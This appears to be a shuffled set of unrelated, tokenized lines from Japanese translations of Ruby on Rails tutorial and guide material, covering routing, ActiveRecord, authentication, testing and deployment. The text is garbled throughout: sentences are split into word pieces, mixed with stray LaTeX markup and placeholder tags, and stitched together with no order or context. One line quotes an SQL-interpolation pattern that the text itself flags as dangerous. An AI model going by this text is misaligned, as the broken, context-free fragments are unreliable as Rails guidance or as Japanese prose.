▁User モデルに \ k ode { password _ digest } 属性 を追加し 、 Gemfile に bcrypt を追加した ことで 、 よう や く User モデル 内で \ k ode { has _ secure _ password } が 使える ようになりました ▁( リスト \ ref { code : has _ secure _ password }) 。
▁Ruby では 、 あらゆる もの が オブジェクト です ▟ 従って 、\ k ode { nil } も オブジェクト であり 、 これも 多くの メソッドに 応答 できます 。
▁ どちらの 方法 を使用した 場合 でも 、` routes ▖ rb ` ファイルに 記載 された 順に ルーティング が表示されます 。
▁\ emph { Rails チュートリアル } を 読んで いて 、 チュートリアル 内部 の 別 セクション 番号 へのリンク をクリックして 移動 したら 、 なるべく すぐに 元の 場所に 戻 る ことをお勧めします 。
▁ Cache - Control : ▁no - cache
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を読んでみてください 。
▁get ▁' * pages ', ▁to : ▁' pages # show ', ▁format : ▁true
▁ 今回は ユーザーに ログインを要求 するために 、 リスト \ ref { code : authorize _ before _ filter } のように \ k ode { logged \_ in \_ user } メソッドを 定義 して \ k ode { before \_ action ▁: logged \_ in \_ user } という 形式で 使い ます 。
▁ 同様 の 理由 で 、\ href { https :// github ▖ com / j nick la s / c a p y bar a } { Capybara } ▁gem も Gemfile に記述 しています ▟ これは 、 英語 に 近 い 文法 を使って 、 ユーザー と サンプルアプリケーションの 対 話 的 操作を シ ミ ュ レ ー ション できる Gem です { p 1 } ▟ Capybara は {3} S elenium {/3} などの gem に依存し ています 。
▁これは つまり 、
▁ フォント
▁Rack に 準 拠 した Web サーバー で 、 Rails アプリケーションを 提供する には 、` Rails ▖ application ` オブジェクト を使用する必要があります 。
▁fixture 内の 最初の ユーザーを 管理者 にする
▁ 登録 していない 場合は 、 上 記 を参照 して 登録 しておいてください 。
▁ / db /* ▖ sqlite 3
▁<%= ▁form _ for (@ article , ▁remote : ▁true ) ▁do ▁| f | ▁%>
▁ SELECT ▁C O U N T ▁ (* ) ▁AS ▁count _ all , ▁status ▁AS ▁status
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / name _ error ▖ rb ` です 。
▁ それ とは 対 照 的に 、 Rails で ユーザーを モデリング するとき は 、 属性 を明示的に 識 別 する 必要がありません 。
▁validates _ with ▁My Validator
▁\ ref { sec : successful _ signup s } でも 説明します が 、 ユーザーの 作成 で 重要なのは \ k ode { input } ごとに ある 特殊な \ k ode { name } 属性 です 。
▁create _ table ▁: comments ▁do ▁| t |
▁` magazine _ ad _ path ` を使用すると 、 id を 数字 で 渡す 代りに ` Magazine ` と ` A d ` のインスタンス を 引数として 渡す ことができます 。
▁\ k ode { send } メソッド の動作 原 理 が わ か った ので 、 それ に基いて \ k ode { authenticated ?} メソッド を書き換え ます 。
▁< td > <%= ▁link _ to ▁" Edit ", ▁edit _ book _ path ( book ) ▁%></ td >
▁` title ize ` メソッドは ` title case ` の別名 です 。
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products , ▁as : ▁: item ▁%>
▁Rails の コントローラは 、 デフォルトでは 正しい ルーティング に対応する 名前を持つ ビュー を自動的に 選 び 、 それ を使用して レスポンス を出力します 。
▁ここでは 、 form タグ の 内部で \ k ode { data - remote =" true "} 変数 を設定し ています ▟ これは 、 JavaScript による フォーム 操作を 許可 すること を Rails に 知 ら せる ためのものです 。
▁リスト \ ref { code : demo _ users _ controller } は 、 scaffold で生成した コントローラの 骨 格 です 。
▁The ▁string ▁is ▁nonempty ▖
▁email _ with _ name ▁= ▁% (" # {@ user ▖ name } " ▁< # {@ user ▖ email } > )
▁ テスト ユーザー で ログイン する
▁Rails にある イニシャライザ の リスト を 以下 に まとめ ました ▟ これらは 定義された 順序 で 並 んで お り 、 特 記事 項 の ない限り 実行されます 。
▁ 編集 の 失敗 に対するテスト ▁ {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ 基本 タイトル としては これで 正しい のですが 、 末尾に 余分な 縦 棒 \ k ode { | } が 残 って しま っています 。
▁` distinct ` メソッドは 、 コレクション 内で 重複 が発生し ない ようにします 。
▁# ▁Rails ▁3 ▖ x
▁ レシーバ ー から キーを 取り除く 破壊的な ` except !` もあります 。
▁ コマンド プロンプト の カ ー ソ ル が ふ た た び 表示され れば 、 サーバー は 停 止 しています 。
▁now ▖ all _ day
▁この HTML の 細 か い 部分 はほとんど 私 た ち の 目的 には 関係 ありません が 、 この 構造 の 最も 重要な 部分 に注目し てみましょう 。
▁User モデル の存在 確 認 バリデーション の結果
▁\ k ode { User ▖ create !} を実行する 前に 、 Rake タスク が User モデル などの ローカル の Rails 環境 にアクセス できるようにします 。
▁ ユーザーを削除 するためには ログイン して い なく て はならない ので 、 リスト \ ref { code : destroy _ action } では \ k ode { : destroy } アクション も \ k ode { logged \_ in \_ user } フィルター に追加し ています 。
▁Get ▁help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁at ▁the
▁=> ▁ ActionController :: Base
▁ ╼\ end { code }╼╼ ▁\ subsection { データベースの 移 行 } ▁% ▁( fold )╼ ▁\ label { sec : database _ migrations }╼╼
▁このとき 、 この Rails アプリケーションのルート ディレクトリ は 、\ k ode { config } ディレクトリ の 1 つ 上の 階層 に あります ▟ したがって 、 以下の 場所 が ルート ディレクトリ になります 。
▁上 で生成された ファイル を見ると わかるように 、 ビューテンプレート ファイルは 基本的に コントローラのアクション と 関連付け ら れ ています 。
▁これらの ファイルは 、 コントローラ 内にある アクション ごとに 出力 された 結果を ビューで 表示 するために使用されます 。
▁“ Home ” ▁ や ▁“ About ” ▁ のような 静的なページ がない
▁ video ▁= ▁self ▖ argument s ▖ first
▁ これはリスト \ ref { code : close _ route } で使用されていました 。
▁\ k ode { add \_ password \_ digest \_ to \_ users } という マイグレーション ファイル を生成する ためには 、 以下のコマンドを実行し ます 。
▁< div ▁id =" menu "> M en u ▁ items ▁here </ div >
▁ 本番環境 ▁( Web 上 ) ▁ で 実際に ユーザー登録 を してみる
▁# ▁ アセット で 読み 込 んだ 行 を 展開 する 。
▁m attr _ accessor ▁: logger
▁ )▖ on ▁" ajax : error ", ▁( e , ▁ xhr , ▁status , ▁error ) ▁->
▁=> ▁ 59
▁We ’ ll ▁add ▁user ▁edit / update ▁functionality ▁to ▁the ▁sample ▁application ▁in ▁Section ▁\ ref { sec : updating _ users } ▖
▁ データ の検証 が行われていない 。
▁これにより 、` Marshal ` で シリアライズ された 既存の cookies を 、 新しい ` JSON ` ベースの フォーマット に 透 過 的に 移 行 できます 。
▁上の例では 、1 つ目の 疑問符 は ` params [: orders ]` の値 で 置き換え ら れ 、2 つ目の 疑問符 は ` false ` を SQL 形式 に変換 した もの ▁( 変換 方法は アダプタ によって 異なる ) ▁ で 置き換え られます 。
▁` render ` メソッドで できる 最も 単純な 動作 は 、 何も 出力 しない ことでしょう 。
▁上のように 、 Rails には \ text tt { Rails } という オブジェクト があり 、 それ には \ text tt { env } という 属性 があります ▟ この 属性 は 環境 の 論理値 ▁( boolean ) ▁ を 取り 、 attribute ▁and ▁ associated ▁environment ▁boolean ▁methods , ▁so ▁that , ▁for ▁example , ▁\ text tt { Rails ▖ env ▖ test ?}
▁#### ▁ コア 拡張機能 を グループ 化 して 読み込む
▁この ブロック は 、 クライアント が 作成される ときに だけ 実行されます 。
▁また 、 ルート URL のときと同様に 、\ k ode { help \_ path } や \ k ode { help \_ url } といった 名前付きルート も 使える ようになります 。
▁ このような 場合 、 特定の メソッドの 振る舞い だけ ではなく 、 ▁ _ フレームワーク _ ▁ の 振る舞い も ドキュメント 化 する ように したい と思います 。
▁get ▁' profile ', ▁to : ▁: show
▁\ k ode { update \_ attributes } への 呼び出し で \ k ode { user \_ params } を使用して いることに注目してください ▟\ ref { sec : strong _ parameters } でも 説明したように 、 ここでは S trong ▁Parameters を使用して マスアサインメント の 脆弱性 を 防止 しています 。
▁ 結果は {0}{1} 図 2▖1 3 {/1}{/0} の よう になるはずです 。
▁get ▁' : controller / : action / : id '
▁図 \ ref { fig : user _ feed } に 、 サンプル の \ k ode { microposts } データベース テーブル と 、 それを フィード した結果 を示します 。
▁NOTE : ▁ 新しく 作成した ` has _ one ` 関連付け または ` belongs _ to ` 関連付けを 初期化 するには 、` build _ ` で始まる メソッド を使用する必要があります ▟ この場合 ` has _ many ` 関連付け や ` has _ and _ belongs _ to _ many ` 関連付け で使用される ` association ▖ build ` メソッドは 使用 しないでください 。
▁\ k ode { users } テーブル に含まれる データ の サンプル
▁self を省略した 結果を リスト \ ref { code : user _ login _ test _ valid _ information } に示します 。
▁Active ▁Record には 、 返 された どの オブジェクトに対して も 変更 を明示的に 禁 止 する ` readonly ` メソッド があります 。
▁ユーザー登録 失敗 時の デバッグ情報
▁following / follower ページ のテスト
▁ このように 、\ k ode { user } 変数 が 有効 かどうかを \ k ode { valid ?} メソッドで チェック することができます ▟ もし オブジェクトが ひとつ 以上の 検証 に 失敗した ときは 、\ k ode { false } を返します ▟ ▁また 、 すべての バリデーション に 通 った ときに \ k ode { true } を返します 。
▁INFO : ▁Sass や CoffeeScript などの 言語 を使用する場合 は 、 必要な ライブラリ を ` ▖ gem spec ` に追加する 必要があります 。
▁M ▖ parent _ name ▁# ▁=> ▁" X :: Y "
▁create ▁app / views / static _ pages / home ▖ html ▖ erb
▁その モジュール の中に メソッドを 置く ことで 準備 は 完了 します 。
▁ 認 証 機能 の 基本的な 部分 は でき ましたが 、 ユーザーが 登録 を 行った 後 、 その ユーザーが デフォルトでは サインイン して お らず 、 このままでは ユーザーが 混 乱 する 可能性があります 。
▁ 実は 、\ k ode { follower _ id } と \ k ode { followed _ id } を 入 れ 替 え る だけで 、 フォロワー についても ユーザーの フォロー のとき と まったく 同じ 方法 が 使用できます ▟ これは \ k ode { passive _ relationships } と \ k ode { active _ relationships } についても 同じです 。
▁この ヘルパー を使用して 、` has _ one ` または ` has _ many ` リレーションシップ を経由して 関連付けられたオブジェクト が存在し ないこと を検証する と 、` presence ?` でも なく ` marked _ for _ destruction ?` ( 削除 するために マーク されている ) でも ない かどうか が チェック されます 。
▁config ▖ action _ controller ▖ asset _ host ▁= ▁ ENV [' CDN _ H O ST ']
▁` select ` と異なり 、` pluck ` は データベースから 受け取った 結果を 直接 Ruby の配列 に変換 してくれます ▟ そのため の ` ActiveRecord ` オブジェクト を事前に 構成 しておく 必要はありません 。
▁つまり 、 この場合 の 正しい 関係 は以下のようになります 。
▁ 配列 \ k ode { deliveries } は グローバル なので 、\ k ode { setup } メソッドで これを 初期化 して お か ない と 、 並 行 して 行われ る 他の テストで メール が 配信 された ときに エラー で 中 断 してしまいます ▁(\ ref { sec : password _ reset _ test } でも 似 た 事例 をご紹介します ) 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁たとえば 、` Client ▖ where (" first _ name ▁L I K E ▁' % # { params [: first _ name ]} % ' ") ` という 書き 方は 危 険 です 。
▁この コードの 効果 は 、 空の テスト 用 データベース を用意し て User モデルの spec を実行する ことで 確 認 できます 。
▁このオプション は 、 エンジン を削除する 前に マイグレーション を 元に戻 したい場合 など に 便利です 。
▁* ▁FROM ▁articles
▁TIP : ▁このオプション による 変更を すべての ルーティング に 統 一 的に 適用 した く な った 場合は 、 スコープ を使用できます 。
▁app / assets / javascripts / s ub / something ▖ js
▁Rails コンソール では 、 そ の中から コントローラのアクション ▁( 実は メソッド ) ▁ を呼ぶ こともできます 。
▁ このような 動作を ▁“ フレンドリーフォワーディング ” ▁ と呼びます が 、 これ をテストする には 次のような 手順を 踏 みます ▟ まず ユーザーの edit ページ にアクセス し 、 その後 サインイン ページに リダイレクト します 。
▁Rails ▁2 以降 における ビューテンプレート の 標準 拡張子 は 、 ERB ▁( HTML ▁+ ▁e M b ed d ed ▁R u B y ) ▁ で レンダリング する 場合は ` ▖ erb ` 、 Builder ▁( XML ジェネレータ ) ▁ で レンダリング する 場合は ` ▖ builder ` です 。
▁ ある ルーティング を 特定の HTTP 動詞 に 割り当て るために 、 通常 は ` get `、` post `、` put `、` patch `、` delete ` メソッド のいずれか を使用する必要があります 。
▁Home ページ で 動作する ステータスフィード
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / numeric / by te s ▖ rb ` です 。
▁この 実装 が 唯 一 手 間 のか か る 箇所 ですが 、 最新の Rails では \ k ode { has _ secure _ password } を使用する だけで これらの 機能 をすべて 自由に 利用できます 。
▁time _ zone _ options _ for _ select を使用して オプション タグ を生成し 、 指定された オブジェクト と メソッド 用の select タグ と option タグを返します 。
▁ この後 、 Rails サーバー で ユーザーを メールアドレス で 検索 して 有効化トークン を 認 証 できるように したい ので 、 リンク には メールアドレス と トークン を 両方 含 め ておく 必要があります 。
▁この 再設定 用の リンクをクリックすると 、 ユーザーの パスワードを 再設定 して よい かどうか の 確 認 を 求 め る フォーム が表示されます ▁( 図 \ ref { fig : reset _ password _ form _ mockup }) 。
▁上のコードでは \ k ode { pending } メソッド だけ が 置かれ ており 、 何か 意味 のある コード で spec を 埋 め るように 促 しています 。
▁ 本番環境で Rails を サブディレクトリ にデプロイする と 、 Rails の 多くの 部分 に 影 響 が生じ ます 。
▁### ▁ テスト ケース の実行 順序
▁ActiveRecord :: RecordNotFound : ▁Co ul d n ' t ▁find ▁User ▁with ▁ ID = 3
▁class ▁Noti fi er ▁< ▁ ActionMailer :: Base
▁`: allow _ blank ` オプションは `: allow _ nil ` オプション と似ています 。
▁ フラッシュメッセージ は Web サイトの レイアウト に表示される ▁( リスト \ ref { code : layout _ flash }) ▁ ので 、\ k ode { flash [: danger ]} で 設定 した メッセージ は自動的に 表示されます ▟ Bootstrap ▁CSS のおかげで 適切な スタイル も 与 えられ ます ▁( 図 \ ref { fig : failed _ login _ flash }) 。
▁C ▖ subclasses ▁# ▁=> ▁[ B , ▁D ]
▁ 悲 観的ロック では 、 データベース が提供する ロック 機 構 を使用します 。
▁# ▁email カラム を " login " という 名前 でも 参 照 したい
▁リスト \ ref { code : micropost _ validity _ test _ idiomatic } で 書いた コード と 、 先ほど の ステップ が 結合 されている 点に注意 してください 。
▁\ k ode { each } メソッドを使って \ k ode { address es } 配列 の各 要素を 繰り返し 取り出し ました ▁(\ ref { sec : block s }) 。
▁scope ▁: inactive , ▁-> ▁ { ▁where ▁state : ▁' inactive ' ▁ }
▁\ ref { sec : the _ status _ feed } では 、 ユーザーの ステータスフィード を追加して 、 サンプルアプリケーション を 完成させます 。
▁-> ▁ { ▁where ▁ factory : ▁' S eattle ' ▁ }
▁( 上の コマンド が 失敗した場合 は 、 実行 中の サ ンド ボックス の コンソール セッションを 終 了 してみてください ▟ その セッション が データベース を ロック して マイグレーション を 妨 げ ている 可能性があります ) 。
▁#### ▁Action ▁View を出力する
▁* = ▁require _ tree ▁ ▖
▁ この章 と ひとつ 前の 章では 、 実に 多くの 作業を こ な しました ▟ かつ て は 未 熟 そのもの だった アプリケーションを 、 約 束 通り 、 ユーザー登録 機能 や ログイン 機能を 完全に 備 え た 立 派 な アプリケーション へ と 変 身 させる ことができ た のです 。
▁ ╼ ▁# ╼
▁=> ▁" U S ER @ E X A M P LE ▖ C O M "
▁ メソッド には 、 バリデーション を トリガ する もの と 、 しない もの があります 。
▁t ▖ integer ▁: assembly _ id
▁ ユーザーを フォローする 機能 を実装する 第 一 歩 は 、 データモデル を構成する ことです ▟ ただし 、 これは 見た 目 ほど 単 純 ではありません 。
▁Client ▖ where ( active : ▁true )▖ pluck (: id )
▁=> ▁" dude @ a b ide s ▖ org "
▁WARNING : ▁` DateTime ` は 夏 時間 ▁( D ST ) ▁ ルール については 関 知 しません ▟ 夏 時間 の 変更 が 行われた 場合 、 メソッド の一部 が この とおり に 動作 しない ことがあります 。
▁この フォーム が 送信される と 、 エンジン 内の ` / articles / : article _ id / comments ` という ルーティング に対して ` POST ` リクエストを送信し よう とします 。
▁ これはリスト \ ref { code : home _ page _ feed _ test } で使用されていました 。
▁` underscore ` メソッドは 上 と 逆に 、 キャメルケース を パス に変換 します 。
▁email = michael %40 michael hartl ▖ com
▁beginning _ of _ hour ▁( at _ beginning _ of _ hour )
▁この節で 必要な Ruby の プログラミング は 、 本書 の中で は これまで で 最も 難 易 度 が 高 く なっています ▟ どう か 最 後 まで あ き ら め ずに が ん ば ってください ▟ ここ からの 力 仕 事 に 備えて お き ましょう 。
▁PR IM A RY ▁ KEY ▁( id )
▁上のコードでは \ k ode { stylesheet _ link _ tag } 関数 を 2 つの 引数 で 呼んでいます ▟ 最初の 引数 である 文字列 は 、 スタイルシート へのパス を 示 しています ▟ 次の 引数 である ハッシュ には 2 つの 要素 があり 、 最初の 要素 は メディアタイプ を 示 し 、 次の 要素 は Rails ▁4▖0 で 追加 された \ href { https :// github ▖ com / rails / turbolinks } { turbolinks } という 機能 をオンに しています 。
▁#### ▁` dasherize `
▁ ログイン に 成功 すれば 、\ k ode { cookies } 内部 の \ k ode { remember \_ token } キー を調べる ことで 、 ユーザーが 保存 された かどうかを チェック できるようになります 。
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁2
▁最初の ステップ として 、 マイクロポストの パーシャル ▁( リスト \ ref { code : micropost _ partial }) ▁ に 削除リンク を追加します 。
▁ フレンドリーフォワーディング で 、 最初に 与えられた URL に のみ 確 実に 転 送 されている ことを確認する テスト を作成してください 。
▁{0} 図 7 ▖ 16 {/0} ▁{1} ユーザー登録 失敗 時の デバッグ情報 {/1}
▁ 再設定 用 ダイジェスト は データベースに保存 しておき 、 再設定 用 トークン は メールアドレス と 一 緒 に 、 ユーザーに 送信する 有効化 用 メールの リンク に 仕 込 んで お く 。
▁# ▁< b ▁type =" integer "> 2 </ b >
▁where (" created _ at ▁> ▁? ", ▁5 ▖ day s ▖ ago )
▁` ( module | class ) _ eval ( 文字列 ) ` メソッドで 作成される メソッド には 、 生成された コード のインスタンス の そ ば に コメント が置かれます 。
▁ コントローラは 、` Application Controller ` を 継 承 する 形で 定義 される シンプルな クラス です 。
▁\ k ode { spec / routing } ディレクトリ が 見つからない という エラーが表示され た場合 は 、 以下のように 空の ディレクトリ を 作る ことで 回 避 できます 。
▁{0} 図 2▖1 2 {/0} ▁{1} 新しいマイクロポスト の作成 ページ ▁(\ href { http ://0▖0▖0▖0:3000/ microposts / new }{/ microposts / new }) {/1}
▁リスト \ ref { code : account _ activation _ preview } の プレビュー コード を実装する と 、 指定 の URL で アカウント有効化 メールを プレビュー できるようになります
▁ s ▖ html _ safe ?
▁" _ id "▖ humanize ▁# ▁=> ▁" I d "
▁unless : ▁ Proc ▖ new ▁ { ▁| a | ▁a ▖ password ▖ blank ?
▁# ▁< object >
▁render ▁ js : ▁" alert (' Hello ▁Rails ') ; "
▁self を省略した 結果を リスト \ ref { code : rails _ new _ sample _ app } に示します 。
▁ 主要な Unix コマンド 。
▁#### ▁ 名前付き ルーティング を使用して URL を生成する
▁future ?
▁#### # ▁` utc `
▁| ▁| ▁30 5 ▁| ▁: use _ proxy ▁|
▁ メールを 受 信 する
▁### ▁link _ to
▁ できる だけ 多くの 関連 情報 を含め る ようにしてください ▟ また 、 少なくとも 問題 を再 現 できる コード サンプル も 合わせ て 投 稿 してください 。
▁Active ▁Support では 、` attr _ internal _ reader `、` attr _ internal _ writer `、` attr _ internal _ accessor ` という マクロ が 定義 されています 。
▁\ ref { sec : a _ user _ tour } で 説明したとおり 、 id = \ k ode {1} のユーザー にアクセス するための ページの URI は / users /1 となります 。
▁TIP : ▁`: id ` パラメータ では ドット ` ▖ ` を デフォルトでは 使用できません ▟ ドット は フォーマット 済み ルーティング では 区切り 文字 として 使用される ためです 。
▁Time オブジェクトに対して 期間 を 加 減 算 できます 。
▁リスト \ ref { code : update _ columns } の テンプレート に 記 入 することで 、 個 別の \ k ode { update _ attribute } 呼び出し を 単 一 の \ k ode { update _ columns } 呼び出し に 統合 し 、 データベース アクセス が 1 回 で 済 む ようにしてください 。
▁ 作成する フォーム は以下のような感じ になります 。
▁ ユーザー情報 を編集する パターン は 、( 第 \ ref { cha : sign _ up } 章 ) の 新規ユーザー の作成 と 極めて 似 通 っています 。
▁m er ate }╼╼ ▁% ▁subsection ▁ mvc _ in _ action ▁( end )╼╼ ▁\ subsection { Users リソース の 欠 点 } ▁% ▁( fold )╼ ▁\ label { sec : we a k ness es _ of _ this _ users _ resource }╼╼
▁development 環境 の場合
▁ データベースの インデックス
▁xml ▖ em (" emph a size d ")
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / inflections ▖ rb ` です 。
▁Article ▖ order (' id ▁as c ')▖ merge ( Article ▖ unscope (: order ) )
▁この 欠 点を 直 す ために 、 画像 サイズ や フォーマット に対する バリデーション を実装 し 、 サーバー 用 と クライアント ▁( ブラウザ ) ▁ 用の 両方 に追加し ましょう 。
▁X :: Y ▖ local _ constant s ▁# ▁=> ▁ [: Y 1, ▁: X 1 ]
▁本ガイドでは 、 Rails に ビルトイン されている Ajax / JavaScript 機能 など について解説します ▟ これら を 活用 して 、 リ ッ チ な 動的 Ajax アプリケーションを お 手 軽 に 作る ことができます 。
▁| ▁| ▁40 5 ▁| ▁: method _ not _ allow ed ▁|
▁S 3 は 課 金 サービス ですが 、 Rails チュートリアル の サンプルアプリケーション を セットアップ したり テスト するだけで あれば 、 毎 月 1 円 ほど しか 課 金 されません 。
▁| ▁HTTP 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 目的 ▁|
▁ 本ガイド は 、 ゼロ から Rails アプリケーションを 構 築 したい と 考え ている 初心者 を 対象 に しています 。
▁#### # ▁`: counter _ cache `
▁ 今回の テストでは 、\ k ode { pagination } クラスを 持 った \ k ode { div } タグ を チェック して 、 最初の ページに ユーザーが い る ことを確認します 。
▁ユーザーの 一覧 ページ は ついに 完了 しました ▟ 残 る は \ k ode { destroy } だけです ▟ これ を実装する ことで 、 REST に 準 拠 した 正 統 な アプリケーション となります 。
▁Spork を 起動 する 前に 、 以下のように テストスイート を実行して 、 基 準 となる 実行 時間 を 測 定 します 。
▁続いて 、 リモート リポジトリ と production サーバー にも プッシュ します 。
▁` define _ method ` を使用して メソッド を再 定義 する 必要がある が 、 その 名前 が 既に ある かどうか が わからない と ことがあります 。
▁\ ref { sec : embedded _ ruby } では 最初に ERb を 、\ ref { sec : sass } では Sass をそれぞれ 扱 いました 。
▁次に 、 自分 以外の ユーザーのマイクロポスト は 削除 を しようとすると 、 適切 にリダイレクトされる ことを テストで 確認し ます ▁( リスト \ ref { code : micropost _ user _ mis match _ test }) 。
▁=> ▁1
▁ 一見 奇 妙 ですが 、 実行 方法は 簡単です 。
▁ それ でも Cucumber は Ruby の テスティング ツール キ ッ ト として 確 固 た る 地 位 を 占 め ており 、 著者 としては 低 レベル の実装 を 気 に すること なく 高度な 振る舞い を 記 述 できる 点が 特に 気 に 入 っています 。
▁` config ▖ cache _ classes ` が true の場合 、 すべての ` config ▖ autoload _ once _ paths ` 自動 読み込み は 一度 しか 行われ ません 。
▁ このように 書くこと で 、\ k ode { h 1 } タグ ▁( トップレベル の 見 出 し ) ▁ の \ emph { 内 側 にある }、\ k ode { gravatar } クラス 付き の \ k ode { img } タグ があるかどうかをチェック できます 。
▁# ▁=> ▁We d , ▁ 08 ▁Jun ▁2011 ▁01 : 5 6 : 22 ▁- 06 00
▁gem ▁' sass - rails '
▁ユーザー が作成され 、\ href { http ://0▖0▖0▖0:3000/ users /1 }{\ text tt { 図 2▖ 6 } } のように {2} {3} show {/3} {/2} ページ が表示されます
▁( リスト { p 0} の {2} setup {/2} メソッド 内で ログイン 処理を まとめ てしまう ことも 可能です ▟ しかし 、\ ref { sec : friendly _ forwarding } で 片 方 のテスト を ログイン する \ emph { 前に } 編集 ページ にアクセス するよう に変更し たい ので 、 ここで まとめて しま って も 結 局 は 元に戻す こと になってしまいます ▟)
▁このメソッド で 定義 されて る 操作 は 取り 消 し が 可能です ▟ つまり 、 Rails は change メソッドで 行われた マイグレーション を 必要に応じて 元に戻す ことができます 。
▁self を省略した 結果を リスト \ ref { code : sign _ out _ with _ forget } に示します 。
▁これ に とも ない 、 コントローラ 名 、 モデル名 、 テーブル名 は いずれも 名前空間化され ます 。
▁use ▁ ActionDispatch :: Request I d
▁ サンプル データ に マイクロポスト を追加する
▁Rails ▁ 3▖0 以前の バージョン では 、 静 的 ファイルは \ k ode { public / } 以下の 次の ディレクトリ に置かれ ていました 。
▁# ▁ 新規 レコード 作成 時に 、 数字 でない 年 齢 表現 を 使用できる
▁ 技術 的に は 、 Rails は \ k ode { underscore } メソッドを使用して クラス名 を id に変換 しています 。
▁12345678▖ to _ s (: delimited , ▁ delimiter : ▁ "," ) ▁# ▁=> ▁12,345,678
▁* ▁` javascript _ engine ` は 、 アセット 生成 時に ( coffee など で ) 使用する エンジン を設定します 。
▁( The ▁ MIT ▁L ic en se )
▁これらの メソッド を使用したい場合 は ` # to _ a ` を呼び出し て ` Array ` に 変更 してから に してください 。
▁ デプロイ された アプリケーションの 表示 は 、\ k ode { heroku ▁create } ▁( リスト \ ref { code : heroku _ create }) ▁ を実行し た 際に 生成された アドレス を ブラウザで 開 く だけです ▁( もちろん ここ に表示されている 著者 の アドレス ではなく 、 あなた の アドレス を使って ください ) 。
▁この チュートリアル 構成 は 、 Michael ▁E ra s m us による 素晴らしい ブログ 記事 「 5 分 で わ か る Rails ▁3 の Asset ▁Pipeline ▁( 英語 )」 を も と に しています 。
▁3 ▖ 5 ▖ g ig abytes ▁# ▁=> ▁ 37 5 80 9 6 38 4
▁これらの パラメータ を使い やすくするため に 、\ k ode { user \_ params } という 外部 メソッド を使用する のが 慣習 になっています ▟ このメソッドは 適切に 初期化 した ハッシュ を返し 、\ k ode { params [: user ]} の 代 わ り として 使用されます 。
▁最初に ` app / models / comment ▖ rb ` を見てみましょう 。
▁id \ k ode {1} のマイクロポスト を削除する
▁次に Heroku の アカウント を 新規 作成 して 設定 します 。
▁NOTE : ▁ これらは すべて 同じ 定義ファイル ` active _ support / core _ ext / time / calculations ▖ rb ` に あります 。
▁# ▁ 名前 が David で 、 職 業 が コード ア ー テ ィ スト のユーザー をすべて 返 し 、 created _ at カラム で 逆 順 ソ ート する
▁Git には こういった ファイルを 管理 対象 から 除 外 する 機能 があります ▟\ k ode { ▖ gitignore } という ファイルを アプリケーションのルート ディレクトリ に置き 、 除 外 したい ファイル を指定する ための ルール を そこに 記載 します
▁create ▁app / views / microposts / show ▖ json ▖ jbuilder
▁Fri , ▁31 ▁De c ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁### ▁config / application ▖ rb
▁use ▁Rack :: Lock
▁\ emph { Hint } : ▁Use ▁\ k ode { user ▖ reload } ▁to ▁retrieve ▁the ▁new ▁value ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 140 f 50 ' ></ span >╼╼ \ end { enumerate } ╼╼% ▁subsection ▁updating _ the _ reset ▁( end )╼╼ \ subsection { パスワードの再設定 をテストする } ▁% ▁( fold )╼\ label { sec : password _ reset _ test }╼╼
▁X 2 ▁= ▁2
▁| lib / | アプリケーション で使用する 拡張 モジュール が置かれます 。
▁ここで Sass の \ emph { ミックスイン } 機能 ▁( ここでは \ k ode { box _ sizing }) ▁ を使用しています 。
▁` $ ` で始まる 記 述 は コマンド 行 なので 、 これらは コマンドライン に 入力 して 実行 してください 。
▁` to _ date `、` to _ time `、` to _ datetime ` メソッドは 、` Date ▖ _ parse ` を ラ ッ プ して 使い や す く します 。
▁ユーザー と マイクロポストの 自動 関連付け が行われていない
▁# ▁Run ▁ spec s ▁in ▁random ▁order ▁to ▁ s ur fa ce ▁order ▁ dependencies ▖
▁Sessions コントローラのアクション は 、 これまで も RESTful 慣例 に従って サインイン ページ には \ k ode { new } を使用し 、 サインイン の 完了 には \ k ode { create } を使用しました 。
▁ 先ほど リスト \ ref { code : generating _ pages } のように \ k ode { home } ▁ アクションと ▁\ k ode { help } アクション を生成し たので 、 routes ファイル には それぞれの アクション で使用される ルール が 定義 されています ▁( リスト \ ref { code : pages _ routes }) 。
▁has _ many ▁: comments , ▁-> ▁ { ▁order (' post ed _ at ▁DESC ') ▁ }
▁{0} 図 11 ▖ 1 3 {/0} ▁{1} 試 作 フィード がある Home ページのモックアップ {/1}
▁` initializer ` メソッドの ブロック 引数 は 、 アプリケーション 自身 のインスタンス です ▟ その おかげで 、 上の 例 で示した ように 、` config ` メソッドを使用して アプリケーションの 設定 にアクセス できます 。
▁NOTE : ▁ デフォルトの ` config ▖ assets ▖ digest ` オプションは 、 通常 は 変更 しないでください 。
▁ 以下 に 例 を示します 。
▁この 画像 が 既に フィンガープリント 付き で ` public / assets ` に あれば 、 この パス による 参 照 は 有効 になります 。
▁ puts ▁" C all ed "
▁< p > <%= ▁text _ field _ tag ▁' name ' ▁%></ p >
▁Action ▁Mailer ヘルパー を使用する
▁ 作成される のは 通常の ` < form >` なので 、` form _ for ` に関する 情報 はすべて ` button _ to ` にも 適用 できます 。
▁これらの フィーチャー を実行する には 、\ k ode { cucumber } 実行 ファイルを 以下のように 実行 します 。
▁さらに 、\ k ode { config / database ▖ yml } ファイル と 、 PostgreSQL を ローカル 環境で 動作 させる 方法 を学ぶ 必要があります 。
▁Ajax を使った フォロー解除 フォーム
▁ デフォルトの ` config ▖ active _ support ▖ bar e ` が 信 用 できない 場合には ` active _ support / all ` も 必要です 。
▁{0} 図 12 ▖ 22 : {/0} ▁{1} id ▁1 の ユーザーが id ▁2 、 7 、 8 、 10 を フォローしている ときの フィード {/1}
